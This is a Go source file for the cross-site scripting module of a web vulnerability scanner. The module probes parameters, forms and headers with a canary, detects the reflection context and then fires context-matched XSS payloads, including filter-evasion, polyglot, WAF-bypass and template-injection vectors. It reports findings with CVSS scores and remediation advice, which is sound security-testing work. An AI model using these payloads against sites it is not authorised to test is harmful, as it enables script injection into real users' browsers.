package xss

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"github.com/erebus/scanner/internal/client"
	"github.com/erebus/scanner/internal/crawler"
	"github.com/erebus/scanner/internal/modules"
	"github.com/erebus/scanner/internal/waf"
	"golang.org/x/net/html"
)

// xssCanary is an alphanumeric probe that passes through most WAFs and filters,
// used to detect reflection before firing any payload.
const xssCanary = "erebusXSSprobe7x4Q"

type ctxKind int

const (
	ctxUnknown       ctxKind = iota
	ctxHTMLText               // <p>[canary]</p>
	ctxHTMLAttrDQ             // <input value="[canary]">
	ctxHTMLAttrSQ             // <input value='[canary]'>
	ctxHTMLAttrNQ             // <input value=[canary]>
	ctxHTMLAttrURL            // <a href="[canary]">
	ctxHTMLAttrEvent          // <div onclick="[canary]">
	ctxScriptBlock            // <script>var x = [canary]</script>
	ctxScriptStrDQ            // <script>var x = "[canary]"</script>
	ctxScriptStrSQ            // <script>var x = '[canary]'</script>
	ctxScriptStrBT            // <script>var x = `[canary]`</script>
	ctxHTMLTitle              // <title>[canary]</title>
	ctxHTMLComment            // <!-- [canary] -->
)

type ctxInfo struct {
	kind     ctxKind
	tagName  string
	attrName string
}

// payloadsByContext maps each injection context to a targeted payload list.
// Payloads are ordered from most likely to succeed to least.
var payloadsByContext = map[ctxKind][]string{
	ctxHTMLText: {
		`<img src=x onerror=alert(1)>`,
		`<svg onload=alert(1)>`,
		`<svg/onload=alert(1)>`,
		`<details open ontoggle=alert(1)>`,
		`<input autofocus onfocus=alert(1)>`,
		`<ImG sRc=x oNeRrOr=alert(1)>`,
		`<video><source onerror=alert(1)>`,
		`<math><mtext></mtext></math><script>alert(1)</script>`,
		`<body onload=alert(1)>`,
	},
	ctxHTMLAttrDQ: {
		`" onmouseover="alert(1)`,
		`" onfocus="alert(1)" autofocus="`,
		`"><img src=x onerror=alert(1)>`,
		`"><svg/onload=alert(1)>`,
		`" tabindex=1 onfocus=alert(1) x="`,
		`"onmouseover=alert(1) "`,
	},
	ctxHTMLAttrSQ: {
		`' onmouseover='alert(1)`,
		`' onfocus='alert(1)' autofocus='`,
		`'><img src=x onerror=alert(1)>`,
		`'><svg/onload=alert(1)>`,
	},
	ctxHTMLAttrNQ: {
		` onmouseover=alert(1) `,
		`/><img src=x onerror=alert(1)>`,
		` onfocus=alert(1) autofocus `,
	},
	ctxHTMLAttrURL: {
		`javascript:alert(1)`,
		`JaVaScRiPt:alert(1)`,
		`javascript://%0aalert(1)`,
		`data:text/html,<script>alert(1)</script>`,
		`javascript:void(0);alert(1)`,
	},
	ctxHTMLAttrEvent: {
		`alert(1)`,
		`;alert(1)//`,
		`'-alert(1)-'`,
		`"-alert(1)-"`,
		`\x61lert(1)`,
	},
	ctxScriptBlock: {
		`;alert(1)//`,
		`</script><script>alert(1)</script>`,
		"\nalert(1)//",
		`<script>alert(1)</script>`,
	},
	ctxScriptStrDQ: {
		`";alert(1)//`,
		`"-alert(1)-"`,
		`\";alert(1)//`,
		`</script><script>alert(1)//`,
	},
	ctxScriptStrSQ: {
		`';alert(1)//`,
		`'-alert(1)-'`,
		`\';alert(1)//`,
		`</script><script>alert(1)//`,
	},
	ctxScriptStrBT: {
		"`;alert(1)//",
		"${alert(1)}",
		"`+alert(1)+`",
	},
	ctxHTMLTitle: {
		`</title><script>alert(1)</script>`,
		`</TITLE><script>alert(1)</script>`,
	},
	ctxHTMLComment: {
		`--><!--<img src=x onerror=alert(1)><!--`,
		`--><script>alert(1)</script><!--`,
		`--><img src=x onerror=alert(1)><!--`,
	},
}

// deepPayloadsByContext — additional payloads for deep scan mode.
// Covers mXSS vectors, event handler variants, and URL encoding bypasses.
var deepPayloadsByContext = map[ctxKind][]string{
	ctxHTMLText: {
		`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
		`<details/open/ontoggle=alert(1)>`,
		`<meter onmouseover=alert(1)>1</meter>`,
		`<xss id=x tabindex=1 onfocus=alert(1) style=display:block>`,
		`<listing><img src=x onerror=alert(1)></listing>`,
		`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
		`<form><isindex formaction=javascript:alert(1)>`,
	},
	ctxHTMLAttrDQ: {
		`"autofocus onfocus=alert(1) x="`,
		`"onpointerover=alert(1) "`,
		`" onanimationstart=alert(1) style="animation-name:x" "`,
		`" contenteditable onblur=alert(1) "`,
	},
	ctxHTMLAttrSQ: {
		`'autofocus onfocus='alert(1)`,
		`'onpointerover='alert(1)`,
	},
	ctxHTMLAttrURL: {
		`jAvAscrIPt:alert(1)`,
		`java%0ascript:alert(1)`,
		`javascript&#x3A;alert(1)`,
		`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`,
	},
	ctxScriptBlock: {
		"\nalert(1)//",
		`*/alert(1)/*`,
	},
	ctxScriptStrDQ: {
		`\x22;alert(1)//`,
		`";alert(1)//`,
	},
	ctxScriptStrSQ: {
		`\x27;alert(1)//`,
		`';alert(1)//`,
	},
}

// deepPolyglotPayloads — context-agnostic payloads that work across multiple
// injection contexts. Tried in deep mode when the context is ambiguous.
var deepPolyglotPayloads = []string{
	`"><svg/onload=alert(1)>`,
	`'><svg/onload=alert(1)>`,
	`</script><svg/onload=alert(1)>`,
	`<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;49&#41;>`,
	`<script>alert(1)</script>`,
}

// DOM XSS taint sources and dangerous sinks
var domSources = []string{
	"location.search", "location.hash", "document.URL", "document.referrer",
	"URLSearchParams", "window.name", "document.cookie", "location.href",
}

var domSinks = []string{
	".innerHTML", ".outerHTML", "document.write(", "document.writeln(",
	"eval(", "setTimeout(", "setInterval(", ".src =", ".href =",
	"$.html(", ".html(", "insertAdjacentHTML(",
}

var xssHeaders = []string{
	"Referer", "User-Agent", "X-Forwarded-For", "X-Forwarded-Host",
	"X-Real-IP", "X-Original-URL", "X-Rewrite-URL",
}

type Module struct {
	client *client.Client
}

func New(c *client.Client) *Module { return &Module{client: c} }
func (m *Module) Name() string     { return "xss" }

func (m *Module) Run(ctx context.Context, page crawler.Page) ([]modules.Finding, error) {
	var findings []modules.Finding

	// Query parameters
	if u, err := url.Parse(page.URL); err == nil {
		for k := range u.Query() {
			if ctx.Err() != nil {
				break
			}
			if f := m.probeParam(ctx, page.URL, k, false, nil); f != nil {
				findings = append(findings, *f)
			}
		}
	}

	// Form fields
	for fi := range page.Forms {
		form := &page.Forms[fi]
		for _, field := range form.Fields {
			if ctx.Err() != nil {
				break
			}
			if field.Type == "hidden" || field.Type == "submit" || field.Type == "button" {
				continue
			}
			if f := m.probeParam(ctx, page.URL, field.Name, true, form); f != nil {
				findings = append(findings, *f)
			}
		}
	}

	// HTTP header injection
	findings = append(findings, m.testHeaders(ctx, page.URL)...)

	// DOM XSS static analysis on script blocks
	findings = append(findings, analyzeDOMXSS(page)...)

	// Deep mode: template injection (CSTI/SSTI) detection
	if modules.GetMode(ctx) == modules.ModeDeep {
		findings = append(findings, m.testTemplateInjection(ctx, page)...)
	}

	return findings, nil
}

// probeParam implements two-phase context-aware XSS detection:
//  1. Send alphanumeric canary — detect reflection and identify injection context
//  2. Fire only the payloads targeted at that specific context
func (m *Module) probeParam(ctx context.Context, pageURL, param string, isForm bool, form *crawler.Form) *modules.Finding {
	body, err := m.send(ctx, pageURL, param, xssCanary, isForm, form)
	if err != nil || !strings.Contains(string(body), xssCanary) {
		return nil
	}

	cx := detectContext(body, xssCanary)
	if cx.kind == ctxUnknown {
		cx.kind = ctxHTMLText
	}

	payloads := payloadsByContext[cx.kind]
	if len(payloads) == 0 {
		payloads = payloadsByContext[ctxHTMLText]
	}

	// Deep mode: add mXSS / polyglot / encoding-bypass payloads
	if modules.GetMode(ctx) == modules.ModeDeep {
		if extra, ok := deepPayloadsByContext[cx.kind]; ok {
			payloads = append(payloads, extra...)
		}
		payloads = append(payloads, deepPolyglotPayloads...)
	}

	// Augment with WAF-bypass variants when a WAF is detected
	if wafResult := waf.FromContext(ctx); wafResult != nil && wafResult.Kind != waf.Unknown {
		var extra []string
		for _, p := range payloads {
			extra = append(extra, waf.BypassPayloads(p, wafResult.Kind)...)
		}
		if len(extra) > 0 {
			payloads = append(payloads, extra...)
		}
	}

	destURL := pageURL
	if isForm && form != nil {
		destURL = form.Action
	}

	for _, payload := range payloads {
		if ctx.Err() != nil {
			return nil
		}
		resp, err := m.send(ctx, pageURL, param, payload, isForm, form)
		if err != nil {
			continue
		}
		if strings.Contains(string(resp), payload) {
			return &modules.Finding{
				Module:      "xss",
				Severity:    modules.High,
				URL:         appendParam(destURL, param, payload),
				Param:       param,
				Payload:     payload,
				Evidence:    fmt.Sprintf("Context: %s — payload reflected verbatim", contextName(cx.kind)),
				Detail:      fmt.Sprintf("Reflected XSS (%s) in parameter %q%s", contextName(cx.kind), param, attrDetail(cx)),
				CWE:         "CWE-79",
				CVSS:        6.1,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
				Confidence:  modules.Confirmed,
				Remediation: "HTML-encode output at render time; use Content-Security-Policy; avoid reflecting user input into HTML/JS",
				Tags:        []string{"injection", "xss", "reflected", "client-side"},
			}
		}
	}
	return nil
}

func (m *Module) send(ctx context.Context, pageURL, param, value string, isForm bool, form *crawler.Form) ([]byte, error) {
	if isForm && form != nil {
		return m.sendForm(ctx, form, param, value)
	}
	return m.sendQuery(ctx, pageURL, param, value)
}

func (m *Module) sendQuery(ctx context.Context, pageURL, param, value string) ([]byte, error) {
	u, err := url.Parse(pageURL)
	if err != nil {
		return nil, err
	}
	q := u.Query()
	q.Set(param, value)
	u.RawQuery = q.Encode()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
	if err != nil {
		return nil, err
	}
	resp, err := m.client.Do(req)
	if err != nil {
		return nil, err
	}
	return client.ReadBody(resp)
}

func (m *Module) sendForm(ctx context.Context, form *crawler.Form, targetField, value string) ([]byte, error) {
	data := make(url.Values)
	for _, f := range form.Fields {
		if f.Name == targetField {
			data.Set(f.Name, value)
		} else if f.Value != "" {
			data.Set(f.Name, f.Value)
		} else {
			data.Set(f.Name, "test")
		}
	}
	if strings.ToUpper(form.Method) == "POST" {
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, form.Action,
			strings.NewReader(data.Encode()))
		if err != nil {
			return nil, err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := m.client.Do(req)
		if err != nil {
			return nil, err
		}
		return client.ReadBody(resp)
	}
	u, err := url.Parse(form.Action)
	if err != nil {
		return nil, err
	}
	u.RawQuery = data.Encode()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
	if err != nil {
		return nil, err
	}
	resp, err := m.client.Do(req)
	if err != nil {
		return nil, err
	}
	return client.ReadBody(resp)
}

func (m *Module) testHeaders(ctx context.Context, pageURL string) []modules.Finding {
	var findings []modules.Finding
	for _, header := range xssHeaders {
		if ctx.Err() != nil {
			break
		}
		// Phase 1: canary probe
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, pageURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set(header, xssCanary)
		resp, err := m.client.Do(req)
		if err != nil {
			continue
		}
		body, err := client.ReadBody(resp)
		if err != nil {
			continue
		}
		if !strings.Contains(string(body), xssCanary) {
			continue
		}

		// Phase 2: context-specific payloads
		cx := detectContext(body, xssCanary)
		if cx.kind == ctxUnknown {
			cx.kind = ctxHTMLText
		}
		payloads := payloadsByContext[cx.kind]
		if len(payloads) == 0 {
			payloads = payloadsByContext[ctxHTMLText]
		}
		for _, payload := range payloads {
			if ctx.Err() != nil {
				break
			}
			req2, err := http.NewRequestWithContext(ctx, http.MethodGet, pageURL, nil)
			if err != nil {
				continue
			}
			req2.Header.Set(header, payload)
			resp2, err := m.client.Do(req2)
			if err != nil {
				continue
			}
			body2, _ := client.ReadBody(resp2)
			if strings.Contains(string(body2), payload) {
				findings = append(findings, modules.Finding{
					Module:      "xss",
					Severity:    modules.High,
					URL:         pageURL,
					Param:       "header:" + header,
					Payload:     payload,
					Evidence:    fmt.Sprintf("Context: %s — header value reflected verbatim", contextName(cx.kind)),
					Detail:      fmt.Sprintf("Reflected XSS via HTTP header %q", header),
					CWE:         "CWE-79",
					CVSS:        6.1,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
					Confidence:  modules.Confirmed,
					Remediation: "HTML-encode output; do not reflect HTTP headers into page content without sanitization",
					Tags:        []string{"injection", "xss", "reflected", "header"},
				})
				break
			}
		}
	}
	return findings
}

// analyzeDOMXSS performs static taint analysis on inline script blocks.
// It flags potential DOM XSS when a URL/document source and a dangerous sink
// both appear in the same script block.
func analyzeDOMXSS(page crawler.Page) []modules.Finding {
	var findings []modules.Finding
	doc, err := html.Parse(bytes.NewReader(page.Body))
	if err != nil {
		return nil
	}
	var walk func(*html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.ElementNode && strings.ToLower(n.Data) == "script" {
			var sb strings.Builder
			for c := n.FirstChild; c != nil; c = c.NextSibling {
				if c.Type == html.TextNode {
					sb.WriteString(c.Data)
				}
			}
			text := sb.String()
			var srcs, sinks []string
			for _, s := range domSources {
				if strings.Contains(text, s) {
					srcs = append(srcs, s)
				}
			}
			for _, s := range domSinks {
				if strings.Contains(text, s) {
					sinks = append(sinks, s)
				}
			}
			if len(srcs) > 0 && len(sinks) > 0 {
				findings = append(findings, modules.Finding{
					Module:      "xss",
					Severity:    modules.Medium,
					URL:         page.URL,
					Param:       "DOM",
					Payload:     "",
					Evidence:    fmt.Sprintf("Source(s): [%s] → Sink(s): [%s]", strings.Join(srcs, ", "), strings.Join(sinks, ", ")),
					Detail:      "DOM XSS — taint flows from URL/document source to dangerous sink (browser verification required)",
					CWE:         "CWE-79",
					CVSS:        6.1,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
					Confidence:  modules.Potential,
					Remediation: "Sanitize data before passing to innerHTML/eval/document.write; use textContent instead of innerHTML",
					Tags:        []string{"xss", "dom-based", "client-side"},
				})
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(doc)
	return findings
}

// testTemplateInjection probes for client-side (AngularJS/Vue.js) and server-side
// template injection by injecting {{7777*7777}}. If the response contains the
// evaluated result 60481729 but the baseline does not, a template engine is processing
// user input. Non-HTML responses indicate SSTI (Critical); HTML indicates CSTI (High).
func (m *Module) testTemplateInjection(ctx context.Context, page crawler.Page) []modules.Finding {
	const tiProbe = "{{7777*7777}}"
	const tiEval = "60481729"
	var findings []modules.Finding

	baselineHit := strings.Contains(string(page.Body), tiEval)

	submit := func(testURL, param string, body []byte) {
		if baselineHit || !strings.Contains(string(body), tiEval) {
			return
		}
		sev := modules.Critical
		cvss := 9.8
		vec := "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
		detail := "Server-side template injection (SSTI): {{7777*7777}} evaluated to 60481729 — the template engine processes user-controlled input. Likely escalatable to arbitrary code execution."
		cwe := "CWE-94"
		tags := []string{"injection", "ssti", "template-injection", "rce-potential", "deep"}
		if isHTMLBody(body) {
			sev = modules.High
			cvss = 6.1
			vec = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
			detail = "Client-side template injection (AngularJS/Vue.js): {{7777*7777}} evaluated to 60481729 in an HTML context. Escalatable to arbitrary JavaScript execution via {{constructor.constructor('alert(1)')()}}."
			tags = []string{"xss", "template-injection", "angular", "client-side", "deep"}
		}
		findings = append(findings, modules.Finding{
			Module:      "xss",
			Severity:    sev,
			URL:         testURL,
			Param:       param,
			Payload:     tiProbe,
			Evidence:    fmt.Sprintf("{{7777*7777}} evaluated to %q in parameter %q", tiEval, param),
			Detail:      detail,
			CWE:         cwe,
			CVSS:        cvss,
			CVSSVector:  vec,
			Confidence:  modules.Likely,
			Remediation: "Never pass user input to template engines without sandboxing; for CSTI disable Angular interpolation on that field (ng-non-bindable); for SSTI use logic-less templates",
			Tags:        tags,
		})
	}

	if u, err := url.Parse(page.URL); err == nil {
		for k := range u.Query() {
			if ctx.Err() != nil {
				return findings
			}
			body, err := m.sendQuery(ctx, page.URL, k, tiProbe)
			if err != nil {
				continue
			}
			submit(appendParam(page.URL, k, tiProbe), k, body)
		}
	}

	for fi := range page.Forms {
		form := &page.Forms[fi]
		for _, field := range form.Fields {
			if ctx.Err() != nil {
				return findings
			}
			if field.Type == "hidden" || field.Type == "submit" || field.Type == "button" {
				continue
			}
			body, err := m.sendForm(ctx, form, field.Name, tiProbe)
			if err != nil {
				continue
			}
			submit(form.Action, field.Name, body)
		}
	}

	return findings
}

func isHTMLBody(body []byte) bool {
	if len(body) == 0 {
		return false
	}
	n := len(body)
	if n > 100 {
		n = 100
	}
	peek := strings.TrimSpace(strings.ToLower(string(body[:n])))
	return strings.HasPrefix(peek, "<!doctype html") || strings.HasPrefix(peek, "<html")
}

// detectContext parses the HTML response and finds where the canary is reflected.
func detectContext(body []byte, canary string) ctxInfo {
	doc, err := html.Parse(bytes.NewReader(body))
	if err != nil {
		return ctxInfo{kind: ctxUnknown}
	}
	var result ctxInfo
	var found bool
	var walk func(*html.Node)
	walk = func(n *html.Node) {
		if found {
			return
		}
		switch n.Type {
		case html.CommentNode:
			if strings.Contains(n.Data, canary) {
				result = ctxInfo{kind: ctxHTMLComment}
				found = true
				return
			}
		case html.TextNode:
			if !strings.Contains(n.Data, canary) {
				break
			}
			parent := n.Parent
			if parent == nil || parent.Type != html.ElementNode {
				result = ctxInfo{kind: ctxHTMLText}
				found = true
				return
			}
			switch strings.ToLower(parent.Data) {
			case "script":
				result = detectScriptContext(n.Data, canary)
				result.tagName = "script"
			case "title":
				result = ctxInfo{kind: ctxHTMLTitle, tagName: "title"}
			default:
				result = ctxInfo{kind: ctxHTMLText, tagName: parent.Data}
			}
			found = true
			return
		case html.ElementNode:
			for _, attr := range n.Attr {
				if !strings.Contains(attr.Val, canary) {
					continue
				}
				tagLow := strings.ToLower(n.Data)
				attrLow := strings.ToLower(attr.Key)
				switch {
				case isURLAttr(tagLow, attrLow):
					result = ctxInfo{kind: ctxHTMLAttrURL, tagName: tagLow, attrName: attr.Key}
				case strings.HasPrefix(attrLow, "on"):
					result = ctxInfo{kind: ctxHTMLAttrEvent, tagName: tagLow, attrName: attr.Key}
				default:
					result = ctxInfo{
						kind:     detectAttrQuote(body, canary),
						tagName:  tagLow,
						attrName: attr.Key,
					}
				}
				found = true
				return
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(doc)
	if !found {
		return ctxInfo{kind: ctxUnknown}
	}
	return result
}

// detectScriptContext determines whether the canary sits inside a JS string
// literal by walking backwards from the canary position.
func detectScriptContext(scriptText, canary string) ctxInfo {
	idx := strings.Index(scriptText, canary)
	if idx == -1 {
		return ctxInfo{kind: ctxScriptBlock}
	}
	for i := idx - 1; i >= 0; i-- {
		switch scriptText[i] {
		case '"':
			return ctxInfo{kind: ctxScriptStrDQ}
		case '\'':
			return ctxInfo{kind: ctxScriptStrSQ}
		case '`':
			return ctxInfo{kind: ctxScriptStrBT}
		case ';', '\n', '{', '}', '(':
			return ctxInfo{kind: ctxScriptBlock}
		}
	}
	return ctxInfo{kind: ctxScriptBlock}
}

// detectAttrQuote checks the raw body bytes to determine quote style.
func detectAttrQuote(body []byte, canary string) ctxKind {
	raw := string(body)
	if strings.Contains(raw, `"`+canary) || strings.Contains(raw, canary+`"`) {
		return ctxHTMLAttrDQ
	}
	if strings.Contains(raw, `'`+canary) || strings.Contains(raw, canary+`'`) {
		return ctxHTMLAttrSQ
	}
	return ctxHTMLAttrNQ
}

var urlAttrs = map[string]map[string]bool{
	"a": {"href": true}, "link": {"href": true},
	"script": {"src": true}, "img": {"src": true},
	"iframe": {"src": true}, "embed": {"src": true},
	"form": {"action": true}, "button": {"formaction": true},
	"input": {"src": true, "formaction": true},
	"object": {"data": true}, "blockquote": {"cite": true},
	"video": {"src": true, "poster": true}, "audio": {"src": true},
	"source": {"src": true},
}

func isURLAttr(tag, attr string) bool {
	if attrs, ok := urlAttrs[tag]; ok {
		return attrs[attr]
	}
	return false
}

func contextName(k ctxKind) string {
	switch k {
	case ctxHTMLText:
		return "html-text"
	case ctxHTMLAttrDQ:
		return "attr[dq]"
	case ctxHTMLAttrSQ:
		return "attr[sq]"
	case ctxHTMLAttrNQ:
		return "attr[unquoted]"
	case ctxHTMLAttrURL:
		return "attr-url"
	case ctxHTMLAttrEvent:
		return "event-handler"
	case ctxScriptBlock:
		return "script-block"
	case ctxScriptStrDQ:
		return "script-str[dq]"
	case ctxScriptStrSQ:
		return "script-str[sq]"
	case ctxScriptStrBT:
		return "script-template-literal"
	case ctxHTMLTitle:
		return "html-title"
	case ctxHTMLComment:
		return "html-comment"
	default:
		return "unknown"
	}
}

func attrDetail(cx ctxInfo) string {
	if cx.attrName != "" {
		return fmt.Sprintf(" (attribute %q of <%s>)", cx.attrName, cx.tagName)
	}
	return ""
}

func appendParam(baseURL, param, value string) string {
	u, err := url.Parse(baseURL)
	if err != nil {
		return baseURL
	}
	q := u.Query()
	q.Set(param, value)
	u.RawQuery = q.Encode()
	return u.String()
}
